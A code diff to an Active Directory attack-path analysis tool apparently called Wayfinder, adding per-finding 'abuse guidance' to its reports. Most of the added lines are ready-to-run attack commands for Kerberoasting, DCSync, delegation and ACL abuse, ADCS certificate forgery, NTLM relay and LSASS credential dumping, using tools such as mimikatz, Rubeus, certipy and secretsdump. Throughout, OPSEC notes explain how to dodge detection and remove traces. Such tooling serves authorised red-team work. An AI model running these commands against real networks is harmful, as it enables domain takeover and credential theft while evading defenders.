@@ -41,7 +41,7 @@ import zipfile
 from collections import defaultdict, deque
 from pathlib import Path
 
-VERSION = "1.11.0"
+VERSION = "1.12.0"
 TOOL_NAME = "Wayfinder"
 
 # --------------------------------------------------------------------------
@@ -1959,6 +1959,16 @@ summary h2{display:inline;color:#e8eef7;font-size:16px;margin:0;letter-spacing:.
 .sev-MED{background:rgba(210,153,34,.13);border-color:rgba(210,153,34,.4);color:#e8b339}
 .sev-INFO{background:rgba(88,166,255,.10);border-color:rgba(88,166,255,.3);color:#79b8ff}
 
+/* abuse guidance blocks */
+.abuse{background:none;border:none;border-radius:0;margin:6px 0 0}
+.abuse summary{padding:0;font-size:11.5px;color:#6e7f9a}
+.abuse summary::before{font-size:10px;margin-right:6px}
+.abwrap{margin:6px 0 2px;padding:8px 12px;background:#0d1219;border:1px solid #1e2634;border-radius:6px}
+.abrow{display:flex;gap:10px;padding:3px 0}
+.abl{flex:0 0 74px;font:700 10px ui-monospace,SFMono-Regular,Menlo,monospace;letter-spacing:.06em;padding-top:2px}
+.abl-windows{color:#79b8ff}.abl-linux{color:#e8b339}.abl-opsec{color:#ff7b7b}
+.abc{color:#93a1b6;font-size:12.5px;overflow-wrap:anywhere}
+
 /* search interactions */
 .finding.hit,.path.hit,.inv.hit{box-shadow:inset 0 0 0 1px rgba(88,166,255,.55);border-radius:6px}
 .hide{display:none}
@@ -2028,6 +2038,306 @@ INVENTORY_ORDER = ["Domains", "Users", "Computers", "Groups", "GPOs", "OUs",
                    "Certification Authorities", "PKI Objects"]
 
 
+# --------------------------------------------------------------------------
+# Per-finding abuse guidance (BloodHound-style windowsAbuse / linuxAbuse /
+# opsec). Keyed by finding "kind" and resolved by abuse_for(); only attached
+# where the technique is unambiguous — never guessed.
+# --------------------------------------------------------------------------
+_ABUSE = {
+    "kerberoast": {
+        "windows": "Rubeus.exe kerberoast /user:TARGET /nowrap (or Get-DomainSPNTicket via PowerView). Crack offline: hashcat -m 13100 (RC4), -m 19600/19700 (AES).",
+        "linux": "GetUserSPNs.py DOMAIN/user:'pass' -dc-ip DC_IP -request-user TARGET (or -request for all). Crack with hashcat/john.",
+        "opsec": "Generates 4769 TGS requests; asking for RC4 (etype 0x17) on AES-capable accounts is a staple detection. Roast accounts one at a time, only the ones you need."},
+    "asrep": {
+        "windows": "Rubeus.exe asreproast /user:TARGET /nowrap — no credentials needed. Crack with hashcat -m 18200.",
+        "linux": "GetNPUsers.py DOMAIN/TARGET -no-pass -dc-ip DC_IP (or -usersfile users.txt -no-pass for a list). Crack with hashcat -m 18200.",
+        "opsec": "Generates 4768 events with pre-authentication type 0 — anomalous on monitored networks. Roast singly, never sweep the whole DONT_REQ_PREAUTH list."},
+    "dcsync": {
+        "windows": "mimikatz: lsadump::dcsync /user:DOMAIN\\krbtgt (or any single account) from the principal holding the replication rights.",
+        "linux": "secretsdump.py DOMAIN/user:'pass'@DC_IP -just-dc-user krbtgt (drop -just-dc-user to dump the full directory).",
+        "opsec": "4662 with replication GUIDs (1131f6aa-/1131f6ad-…) is a high-fidelity detection everywhere that matters. Sync individual accounts, from a host that plausibly looks like a DC."},
+    "dcsync_grant": {
+        "windows": "PowerView: Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' -PrincipalIdentity TARGET -Rights DCSync, then mimikatz lsadump::dcsync.",
+        "linux": "dacledit.py -action write -rights DCSync -principal TARGET -target-dn 'DC=corp,DC=local' DOMAIN/user:'pass' -dc-ip DC_IP, then secretsdump.py.",
+        "opsec": "The ACE write logs 5136/4662 before any replication occurs — grants are often caught before the sync. Remove the ACE after use."},
+    "unconstrained": {
+        "windows": "Rubeus.exe harvest /monitor to catch incoming TGTs; coerce a DC to this host (SpoolSample.exe DC_IP TARGETHOST) and reuse the captured TGT.",
+        "linux": "krbrelayx flow: addspn.py an SPN onto your controlled account, coerce with printerbug.py/PetitPotam, export the captured ticket as KRB5CCNAME.",
+        "opsec": "Coercion (SMB/RPC from a DC to your listener) is signatured and Rubeus harvest is EDR-visible. Coerce once, from a path that blends with normal DC traffic."},
+    "s4u": {
+        "windows": "Rubeus.exe s4u /user:TARGET /rc4:<nthash> /impersonateuser:Administrator /msdsspn:cifs/TARGETHOST — S4U2Self + S4U2Proxy to the delegated SPN.",
+        "linux": "getST.py -spn cifs/TARGETHOST -impersonate Administrator DOMAIN/TARGET:'pass' -dc-ip DC_IP; use the .ccache with -k on Impacket tools.",
+        "opsec": "Produces S4U2Self/S4U2Proxy ticket pairs for users who never authenticated from that host — a documented detection. Impersonate accounts with plausible logon patterns."},
+    "constrained": {
+        "windows": "Without protocol transition you need an existing TGT/evidence ticket for the victim: Rubeus s4u /tgs:<ticket> or supply the user's ticket, then S4U2Proxy to the allowed SPN.",
+        "linux": "getST.py with an existing ccache for the victim (getTGT.py first) against the allowed SPN, or pivot via the delegated service account's own session.",
+        "opsec": "Lower-fidelity than full S4U abuse but still leaves 4769 trails. No U2U bypass here — the SPN list is the ceiling."},
+    "rbcd": {
+        "windows": "Write msDS-AllowedToActOnBehalfOfOtherIdentity on the target (Set-DomainComputer via PowerView; Powermad New-MachineAccount for a controlled account), then Rubeus s4u.",
+        "linux": "rbcd.py / bloodyAD to set the delegation (create a controlled account with addcomputer.py if MachineAccountQuota permits), then getST.py -impersonate.",
+        "opsec": "The attribute write logs 4662/5136 on the computer object and is a common alert. Clean the attribute when done."},
+    "gpo": {
+        "windows": "SharpGPOAbuse.exe or PowerSploit's New-GPOImmediateTask to push an immediate scheduled task/startup script through the GPO.",
+        "linux": "pyGPOAbuse.py to inject an immediate task into the GPO's SYSVOL XML.",
+        "opsec": "SYSVOL write + 5136, and the payload lands on every host the GPO links to — loud at scale. Scope links/permissions to the minimum target set."},
+    "sessions": {
+        "windows": "Harvest from the host: mimikatz sekurlsa::logonpasswords / sekurlsa::tickets, or token theft (incognito-style) for the privileged session.",
+        "linux": "secretsdump.py / nxc for local SAM + cached creds; remote LSASS dumping only if you can stage a tool.",
+        "opsec": "LSASS access is the single most-watched telemetry on Windows (Sysmon 10, every EDR). Prefer token impersonation over credential dumps where possible."},
+    "localadmin": {
+        "windows": "Authenticate directly: PsExec / WMI / WinRM with the account's credentials or hash (pass-the-hash for local accounts works without restriction).",
+        "linux": "psexec.py / wmiexec.py / evil-winrm -u USER -H <nthash>. WinRM (5985/5986) blends better than SMB service execution.",
+        "opsec": "Service creation (7045) and 4624 type-3 logons are standard lateral-movement detections; prefer WMI/WinRM over PsExec-style service drops."},
+    "laps_read": {
+        "windows": "PowerView: Get-DomainComputer TARGET -Properties ms-mcs-admpwd (or Get-ADComputer). Then PsExec/WinRM in with the recovered local admin password.",
+        "linux": "ldapsearch / bloodyAD get search for ms-Mcs-AdmPwd (or pyLAPS), then psexec.py with the recovered password.",
+        "opsec": "Password-attribute reads are auditable (4662) and LAPS reads specifically are commonly alerted. Read only the host you intend to use."},
+    "gmsa_read": {
+        "windows": "Get-ADServiceAccount -Identity TARGET -Properties PrincipalsAllowedToRetrieveManagedPassword, or DSInternals Get-ADReplAccount to derive the password.",
+        "linux": "gMSADumper.py / bloodyAD to read msDS-ManagedPassword and derive the NTLM hash; use it with any -k/hash-capable tool.",
+        "opsec": "Same audit surface as LAPS reads (4662). gMSA password derivation is offline once read — one read, then leave."},
+    "crossdomain": {
+        "windows": "Run the same technique in the target domain using cross-referral tickets — mimikatz asktgs /service:krbtgt/TARGETDOMAIN with the trust context.",
+        "linux": "getST.py / getTGT.py against the target domain's KDC (referrals resolve automatically with the trust account's keys).",
+        "opsec": "Cross-domain authentication generates 4768/4769 on both sides of the trust — the path is visible in both forests' logs."},
+    "trust_sidhist": {
+        "windows": "Forge a ticket carrying privileged SIDs across the trust: mimikatz kerberos::golden with /sids:S-1-5-21-<target>-519, or sid::add for SIDHistory injection.",
+        "linux": "ticketer.py -extra-sids S-1-5-21-<targetdomain>-519 with the trust account key; for child→parent, raisechild.py automates it.",
+        "opsec": "Golden tickets with anomalous group membership (e.g. Enterprise Admins appearing across a forest trust) trip SID-anomaly detections; mimic realistic group sets."},
+    "relay": {
+        "windows": "Stage ntlmrelayx via SOCKS from a foothold, or Inveigh for local capture; WebClient hosts allow HTTP coercion over port 80.",
+        "linux": "Coerce (PetitPotam.py / Coercer / printerbug.py) and relay: ntlmrelayx.py -t ldap://DC_IP (RBCD write), ldaps:// (shadow creds), ADCS HTTP (ESC8), or unsigned SMB for socks/dump.",
+        "opsec": "Coercion is network-noisy (target → listener SMB/RPC) and heavily signatured. One-shot it with the relay pre-staged; don't spray coercions."},
+    "hybrid": {
+        "windows": "MSOL_* typically holds DCSync (see DCSync Rights). For AZUREADSSOACC$: kerberoast it, then mimikatz kerberos::golden with its NTLM hash for Seamless SSO silver tickets into Entra ID.",
+        "linux": "Kerberoast AZUREADSSOACC$ (GetUserSPNs.py), then ticketer.py a silver ticket for the SSO SPN; use it against login.microsoftonline.com to become any synced user.",
+        "opsec": "Cloud-side, role activation and token use land in Entra sign-in/audit logs. On-prem kerberoast of the SSO account is indistinguishable from any other roast."},
+    "azure_rbac": {
+        "windows": "Az PowerShell / Azure CLI with the principal's token or creds; for MS Graph app roles (e.g. RoleManagement.ReadWrite.Directory), grant yourself privileged roles directly via Graph calls.",
+        "linux": "Azure CLI / ROADtools / Graph REST with the stolen token or service-principal secret.",
+        "opsec": "Entra sign-in and audit logs capture token use, role assignments and key reads; use tokens from an IP and user-agent consistent with the principal's normal behavior."},
+    "golden_cert": {
+        "windows": "Steal the CA private key on the CA host (mimikatz dpapi::capi / SharpDPAPI certificates), then forge certs offline with ForgeCert.exe.",
+        "linux": "certipy ca -backup to extract the CA key over the CA's RPC interface, then certipy forge to mint certs for any identity.",
+        "opsec": "Forged certs bypass revocation and survive password resets — extremely quiet in use; the noisy step is touching the CA host/key once."},
+    "ntauth": {
+        "windows": "Publish a rogue CA certificate into NTAuthCertificates (Certify / PSPKI); certs issued by your rogue CA become trusted domain-wide.",
+        "linux": "certipy ca / certipy template isn't needed — write the rogue CA cert to the NTAuth store via LDAP modify (bloodyAD), then forge.",
+        "opsec": "Writes to CN=NTAuthCertificates are rare and highly alertable (5136). The payoff is durable; the write itself is the detection window."},
+    "reversible": {
+        "windows": "Passwords stored with reversible encryption come back as cleartext in any directory read — mimikatz lsadump::dcsync output or NTDS extraction includes them.",
+        "linux": "secretsdump.py / DCSync output shows these passwords in cleartext — no cracking step at all.",
+        "opsec": "No additional noise beyond the replication/dump itself; treat the recovered passwords as live credentials elsewhere (reuse is common)."},
+    "precreated": {
+        "windows": "Pre-created computer accounts keep the default password <machinename>$ (lowercase, minus trailing $). Authenticate with it, then reset via net/rpcclient.",
+        "linux": "rpcclient / kpasswd with computername$ as user and password, then use the account normally (addcomputer-style workflows).",
+        "opsec": "Low — these accounts are rarely monitored, but the password change itself logs 4724. Status-0xC0000072 (disabled) means assign-clients-first workflow already happened."},
+}
+
+# Per-ACL-right abuse guidance for the Dangerous ACLs section
+_ACL_ABUSE = {
+    "GenericAll": {
+        "windows": "On a user: Set-DomainUserPassword (PowerView). On a group: Add-DomainGroupMember. On a computer: RBCD or targeted Kerberoast (set an SPN). On the domain: grant DCSync.",
+        "linux": "bloodyAD set password / add groupMember / add rbcd, or net rpc password for resets — full control means pick the quietest primitive for the target kind.",
+        "opsec": "Password resets log 4724 and lock the victim out (attribution risk); ACL/group changes log 5136/4728-4732. Prefer targeted Kerberoast (an SPN write) over resets when stealth matters."},
+    "WriteDacl": {
+        "windows": "PowerView Add-DomainObjectAcl -Rights <needed right> to grant yourself GenericAll/DCSync on the target.",
+        "linux": "dacledit.py -action write -rights FullControl -principal TARGET -target TARGETOBJ DOMAIN/user:'pass'.",
+        "opsec": "ACE writes log 5136/4662 and DACL-change alerts are common on tier-0 objects. Grant the minimum right, then remove the ACE."},
+    "WriteOwner": {
+        "windows": "Set-DomainObjectOwner to take ownership, then Add-DomainObjectAcl for full control.",
+        "linux": "owneredit.py -action write -new-owner TARGET -target TARGETOBJ, then dacledit.py.",
+        "opsec": "Owner change + DACL change is two 5136s in quick succession — a recognized two-step pattern. Execute both from the same session, quickly, or accept the exposure."},
+    "Owns": {
+        "windows": "Owner already: Add-DomainObjectAcl -Rights All to grant yourself full control (ownership implicitly allows WriteDacl).",
+        "linux": "dacledit.py directly — as owner you can rewrite the DACL without further steps.",
+        "opsec": "One 5136 instead of two (no ownership flip needed). Same DACL-change alerting applies."},
+    "ForceChangePassword": {
+        "windows": "Set-DomainUserPassword -Identity TARGET -AccountPassword <new> (PowerView) — no current password needed.",
+        "linux": "net rpc password TARGET 'newpass' -U DOMAIN/user%'pass' -S DC_IP, or bloodyAD set password.",
+        "opsec": "Logs 4724 and locks the victim out — loud and attributable. Weigh against targeted Kerberoast if you have an SPN-write alternative."},
+    "AllExtendedRights": {
+        "windows": "Includes ForceChangePassword: Set-DomainUserPassword the target; on the domain object it also implies replication rights (DCSync).",
+        "linux": "net rpc password / bloodyAD set password; on a domain object treat as DCSync-capable (secretsdump.py).",
+        "opsec": "Same as ForceChangePassword — 4724 + lockout. On domain objects the replication path is noisier (4662) than the reset."},
+    "AddMember": {
+        "windows": "Add-DomainGroupMember -Identity GROUP -Members TARGET (PowerView) to add your principal.",
+        "linux": "net rpc group addmem GROUP TARGET -U DOMAIN/user%'pass' -S DC_IP, or bloodyAD add groupMember.",
+        "opsec": "Logs 4728/4732/4756. Membership in watched groups (tier-0) is often diffed on a schedule — add, use, remove."},
+    "AddSelf": {
+        "windows": "Add-DomainGroupMember to add yourself.",
+        "linux": "net rpc group addmem / bloodyAD add groupMember with your own principal.",
+        "opsec": "Same membership-change telemetry as AddMember."},
+    "GenericWrite": {
+        "windows": "Write any property: commonly servicePrincipalName for targeted Kerberoast, or logonscript for session hijack (Set-DomainObject).",
+        "linux": "targetedKerberoast.py or bloodyAD to set the SPN, then GetUserSPNs.py -request-user.",
+        "opsec": "SPN writes are quieter than password resets (5136 vs 4724) and don't lock anyone out — preferred when available."},
+    "WriteSPN": {
+        "windows": "Set-DomainObject -Set @{serviceprincipalname='x/y'} then Rubeus kerberoast /user:TARGET (targeted Kerberoast).",
+        "linux": "targetedKerberoast.py, or bloodyAD set SPN then GetUserSPNs.py -request-user.",
+        "opsec": "One 5136 for the SPN write plus a 4769 for the ticket request — much quieter than a password reset. Remove the SPN after roasting."},
+    "WriteAccountRestrictions": {
+        "windows": "RBCD: set msDS-AllowedToActOnBehalfOfOtherIdentity on the target, then Rubeus s4u /impersonateuser.",
+        "linux": "rbcd.py / bloodyAD add rbcd, then getST.py -impersonate Administrator.",
+        "opsec": "Attribute write logs 4662/5136 on the computer object. Clean the delegation after use."},
+    "AddAllowedToAct": {
+        "windows": "Add your controlled principal to msDS-AllowedToActOnBehalfOfOtherIdentity, then Rubeus s4u.",
+        "linux": "bloodyAD add rbcd / rbcd.py, then getST.py -impersonate.",
+        "opsec": "Same as WriteAccountRestrictions — 4662/5136 on the target computer; clean up afterwards."},
+    "AddKeyCredentialLink": {
+        "windows": "Shadow Credentials: Whisker.exe add /target:TARGET, then Rubeus asktgt with the generated certificate (PKINIT).",
+        "linux": "pywhisker.py -t TARGET -a add, then gettgtpkinit.py / certipy auth for the NT hash.",
+        "opsec": "Writes msDS-KeyCredentialLink (5136) — monitored on tier-0 accounts, but no password change and no lockout. Remove the key credential after use."},
+    "WriteGPLink": {
+        "windows": "Link a GPO you control to this OU/domain (Set-DomainObject gplink or Group Policy console), then push content via SharpGPOAbuse.",
+        "linux": "bloodyAD to write the gPLink attribute, then pyGPOAbuse.py for content.",
+        "opsec": "GPO application drops artifacts on every host under the link — loud at scale; link to the narrowest OU that contains the target."},
+    "WriteAltSecurityIdentities": {
+        "windows": "Map an arbitrary certificate to the account via altSecurityIdentities (ESC14 surface) — then PKINIT with that cert.",
+        "linux": "certipy / bloodyAD to write the mapping, then certipy auth with the mapped certificate.",
+        "opsec": "Attribute writes on the account (5136); certificate-mapping abuse is newer and less commonly alerted, but the write itself may be."},
+    "WritePKINameFlag": {
+        "windows": "Edit the template's msPKI-Certificate-Name-Flag to enable enrollee-supplied subject (turns the template into ESC1).",
+        "linux": "certipy template -template T -write-default-configuration or targeted attribute write, then certipy req with -upn.",
+        "opsec": "Template edits are 5136-visible and PKI auditing flags configuration changes; snapshot the original attribute values for rollback."},
+    "WritePKIEnrollmentFlag": {
+        "windows": "Edit msPKI-Enrollment-Flag to drop manager-approval/signature requirements on the template.",
+        "linux": "certipy template attribute write, then request normally.",
+        "opsec": "Same as WritePKINameFlag — config changes on templates are a recognized ESC detection; roll back after issuance."},
+    "WritePublicInformation": {
+        "windows": "Set-DomainObject to write info/description fields — low impact alone; useful for pretexting or hiding data in directory attributes.",
+        "linux": "bloodyAD / ldapmodify on the public-info attributes.",
+        "opsec": "Low-value write, minimal alerting — but also minimal payoff; mostly a persistence/exfil side channel."},
+    "ManageCA": {
+        "windows": "ESC7: manage the CA — approve pending requests or edit CA config (certsrv / PSPKI) to enable EDITF_ATTRIBUTESUBJECTALTNAME2.",
+        "linux": "certipy ca -ca CANAME -issue-request ID to approve; -enable-template / config changes for ESC6-style follow-up.",
+        "opsec": "CA configuration changes and issued certs generate 4886/4887; CA role abuse is a Certified Pre-Owned detection staple."},
+    "ManageCertificates": {
+        "windows": "ESC7 (officer role): approve pending certificate requests (certmgr.msc / PSPKI Approve-CertificateRequest).",
+        "linux": "certipy ca -ca CANAME -issue-request ID on a pending request you submitted for a privileged identity.",
+        "opsec": "Approval events are logged (4887); deny-then-approve patterns are anomalous. Submit, approve, revoke nothing."},
+}
+
+# Per-ESC abuse guidance for the ADCS section
+_ESC_ABUSE = {
+    1: {
+        "windows": "Certify.exe request /ca:CA\\CANAME /template:TEMPLATE /altname:Administrator — enrollee-supplied SAN gives you a cert for any identity.",
+        "linux": "certipy req -u USER@DOMAIN -ca CANAME -template TEMPLATE -upn administrator@DOMAIN, then certipy auth (PKINIT) for the NT hash.",
+        "opsec": "Certificate issuance logs 4886/4887 with the SAN visible — altname requests for admin accounts are the canonical ESC1 detection. Enroll once, for exactly the identity you need."},
+    2: {
+        "windows": "Any-purpose/SubCA template: Certify request, then use the cert for client auth — or if SubCA, issue your own certs signed by it.",
+        "linux": "certipy req the template; use via certipy auth (client auth) or forge downstream certs if it's a SubCA.",
+        "opsec": "Same issuance telemetry as ESC1; SubCA issuance is rarer and more anomalous."},
+    3: {
+        "windows": "Two-step: Certify request an enrollment-agent cert, then Certify request ... /onbehalfof Administrator with the agent cert.",
+        "linux": "certipy req the agent template, then certipy req -on-behalf-of administrator@DOMAIN -pfx agent.pfx the target template.",
+        "opsec": "Two issuance events tied by the agent EKU — the on-behalf-of pattern is specifically detectable (4887 with requester ≠ subject)."},
+    6: {
+        "windows": "EDITF_ATTRIBUTESUBJECTALTNAME2 set on the CA: request ANY template with Certify /altname:Administrator.",
+        "linux": "certipy req any published template with -upn administrator@DOMAIN — the CA honors the SAN regardless of template flags.",
+        "opsec": "SAN abuse on a flag-misconfigured CA is identical in telemetry to ESC1 — altname/UPN mismatch is the detection."},
+    7: {
+        "windows": "ManageCA/ManageCertificates: approve pending requests or edit CA config (enable EDITF_ATTRIBUTESUBJECTALTNAME2 / disable security extension), then ESC6-style request.",
+        "linux": "certipy ca -ca CANAME -issue-request ID to approve; certipy ca ... -enable-template / config edits for follow-on abuse.",
+        "opsec": "CA config changes + issuance events (4886/4887) — role abuse on the CA itself is well covered by Certified Pre-Owned detections."},
+    8: {
+        "windows": "Relay coerced NTLM to the web enrollment endpoint — stage ntlmrelayx through SOCKS from a foothold; coerce DCs with SpoolSample.",
+        "linux": "ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp --adcs --template DomainController -smb2support, plus PetitPotam/Coercer against the DC.",
+        "opsec": "The noisiest ESC: coercion traffic + relay + a DC cert request in seconds. Machine-account certs expire slow — one success is enough."},
+    9: {
+        "windows": "No security extension: certs aren't SID-bound — any cert for a matching UPN maps by name; combine with template/CA write access.",
+        "linux": "certipy req a cert for the target UPN (given a writable template / ESC1-like primitive) — it authenticates as that account by name mapping.",
+        "opsec": "Name-mapped certs survive password changes — quiet in use; the setup write is the detection surface."},
+    10: {
+        "windows": "Weak certificate mapping on DCs (StrongCertificateBindingEnforcement off): a cert with a matching UPN/DNS SAN authenticates as that account.",
+        "linux": "certipy req a cert whose SAN matches the target's UPN, then certipy auth — mapping falls back to name comparison.",
+        "opsec": "Exploits DC-side config, not issuance — issuance telemetry looks normal; detection is on the KDC's mapping audit."},
+    11: {
+        "windows": "IF_ENFORCEENCRYPTICERTREQUEST not set: relay NTLM to the RPC (ICPR) enrollment interface via SOCKS + ntlmrelayx.",
+        "linux": "ntlmrelayx.py -t rpc://CA --rpc-mode ICPR --adcs with the usual coercion flow.",
+        "opsec": "Same coercion/relay noise profile as ESC8, against the RPC interface instead of HTTP."},
+    13: {
+        "windows": "Issuance policy linked to a group (Authentication Mechanism Assurance): Certify request the template — holding the cert confers the linked group's rights.",
+        "linux": "certipy req the template, then certipy auth — the PAC includes the linked group SID while the cert is used.",
+        "opsec": "Membership never appears in the group's member list — stealthy persistence; issuance events (4886/4887) are the trail."},
+    15: {
+        "windows": "EKUwu (CVE-2024-49019): schema v1 template + enrollee-supplied EKU — Certify request with an application policy of Client Authentication.",
+        "linux": "certipy req -template TEMPLATE -application-policies 'Client Authentication' to turn a web-server template into a client-auth cert.",
+        "opsec": "Issuance with an EKU the template never offered is directly visible in 4886/4887 — flag-shaped for detections."},
+    16: {
+        "windows": "CA security extension disabled globally: every cert maps weakly (ESC9-style, CA-wide) — request certs for target UPNs.",
+        "linux": "certipy req for the target identity's UPN, then certipy auth — name mapping applies to all certs from this CA.",
+        "opsec": "The CA-wide misconfiguration is the finding; abuse telemetry matches ESC9/ESC10 name-mapping."},
+}
+
+
+def abuse_for(title, f):
+    """Resolve BloodHound-style abuse guidance for a finding, or None.
+
+    Only returns guidance where the technique is unambiguous from the
+    finding's own fields — never guessed."""
+    name = f.get("name", "")
+    detail = f.get("detail", "")
+    if title == "Kerberoastable Accounts":
+        return _ABUSE["kerberoast"]
+    if title == "AS-REP Roastable Accounts":
+        return _ABUSE["asrep"]
+    if title == "DCSync Rights":
+        if "DCSync possible" in detail:
+            return _ABUSE["dcsync"]
+        if "grant self DCSync" in detail:
+            return _ABUSE["dcsync_grant"]
+        return None
+    if title == "Delegation Abuse":
+        if "Unconstrained delegation" in detail:
+            return _ABUSE["unconstrained"]
+        if "TrustedToAuth" in detail:
+            return _ABUSE["s4u"]
+        if detail.startswith("RBCD"):
+            return _ABUSE["rbcd"]
+        if "Constrained delegation" in detail:
+            return _ABUSE["constrained"]
+        return None
+    if title.startswith("Dangerous ACLs"):
+        return _ACL_ABUSE.get(f.get("right", ""))
+    if title.startswith("ADCS Abuse"):
+        if name.startswith("Golden Cert"):
+            return _ABUSE["golden_cert"]
+        if "NTAuthStore" in name:
+            return _ABUSE["ntauth"]
+        m = re.match(r"ESC(\d+)", name)
+        if m:
+            return _ESC_ABUSE.get(int(m.group(1)))
+        return None
+    if title == "GPO Control":
+        return _ABUSE["gpo"] if "--" in name else None
+    if title == "Privileged User Sessions":
+        return _ABUSE["sessions"]
+    if title == "Non-standard Local Admins":
+        return _ABUSE["localadmin"]
+    if title == "LAPS & gMSA Readers":
+        if "gMSA" in detail:
+            return _ABUSE["gmsa_read"]
+        if "LAPS password" in detail:
+            return _ABUSE["laps_read"]
+        return None
+    if title == "Cross-Domain Control Edges":
+        return _ABUSE["crossdomain"]
+    if title == "Domains & Trusts":
+        return _ABUSE["trust_sidhist"] if "SID filtering DISABLED" in detail else None
+    if title == "NTLM Relay Surface":
+        return _ABUSE["relay"]
+    if title == "Weak Crypto & UAC Flags":
+        return _ABUSE["reversible"] if "reversible" in detail.lower() else None
+    if title == "Stale & Pre-created Accounts":
+        return _ABUSE["precreated"] if "pre-created" in (name + detail).lower() else None
+    if title == "Hybrid / Entra ID":
+        return _ABUSE["hybrid"]
+    if title == "Azure RBAC & Graph Permissions":
+        return _ABUSE["azure_rbac"]
+    return None
+
+
 def build_inventory(g):
     """Domain object inventory for the HTML sidebar, split high-value/standard."""
     inv = {}
@@ -2067,6 +2377,20 @@ def build_inventory(g):
         e["high"].sort()
         e["std"].sort()
     return inv
+
+
+def _abuse_html(f):
+    """Render a finding's abuse guidance as a collapsed details block."""
+    ab = f.get("abuse")
+    if not ab:
+        return ""
+    rows = []
+    for lbl, key in (("Windows", "windows"), ("Linux", "linux"), ("OPSEC", "opsec")):
+        if ab.get(key):
+            rows.append(f"<div class='abrow'><span class='abl abl-{key}'>{lbl}</span>"
+                        f"<span class='abc'>{_esc(ab[key])}</span></div>")
+    return ("<details class='abuse'><summary>Abuse guidance</summary>"
+            f"<div class='abwrap'>{''.join(rows)}</div></details>")
 
 
 def render_html(stats, sections, paths, wins, inventory=None):
@@ -2116,7 +2440,7 @@ def render_html(stats, sections, paths, wins, inventory=None):
     for i, (title, f) in enumerate(wins, 1):
         o.append(f"<div class='finding sv-{_esc(f['sev'])}'><span class='sev sev-{_esc(f['sev'])}'>{_esc(f['sev'])}</span>"
                  f"<span class='fname'>{i}. {_esc(f['name'])}</span>"
-                 f"<div class='fdetail'>{_esc(title)}</div></div>")
+                 f"<div class='fdetail'>{_esc(title)}</div>{_abuse_html(f)}</div>")
     o.append("</div></details>")
 
     # attack paths as SVG chains
@@ -2145,6 +2469,7 @@ def render_html(stats, sections, paths, wins, inventory=None):
             if f.get("os_histogram"):
                 rows = " &middot; ".join(f"{_esc(k)}: {v}" for k, v in f["os_histogram"].items())
                 o.append(f"<div class='hist'>{rows}</div>")
+            o.append(_abuse_html(f))
             o.append("</div>")
         o.append("</div></details>")
 
@@ -2187,7 +2512,7 @@ def render_html(stats, sections, paths, wins, inventory=None):
              "if(!q)return;"
              "var chips=Array.prototype.slice.call(document.querySelectorAll('.chip'));"
              "var tiles=Array.prototype.slice.call(document.querySelectorAll('.tile'));"
-             "var secs=Array.prototype.slice.call(document.querySelectorAll('details'));"
+             "var secs=Array.prototype.slice.call(document.querySelectorAll('details:not(.abuse)'));"
              "var items=Array.prototype.slice.call(document.querySelectorAll('.finding,.path,.inv'));"
              "function filt(){"
              "var s=q.value.trim().toLowerCase(),total=0;"
@@ -2406,6 +2731,13 @@ def main():
     if az_docs:
         sections["Hybrid / Entra ID"] = find_hybrid(g, az_docs)
         sections["Azure RBAC & Graph Permissions"] = find_azure_rbac(g, az_docs)
+
+    # attach BloodHound-style abuse guidance (flows into JSON + HTML output)
+    for title, findings in sections.items():
+        for f in findings:
+            ab = abuse_for(title, f)
+            if ab:
+                f["abuse"] = ab
 
     for title, findings in sections.items():
         sorted_f = print_section(title, findings, limit)
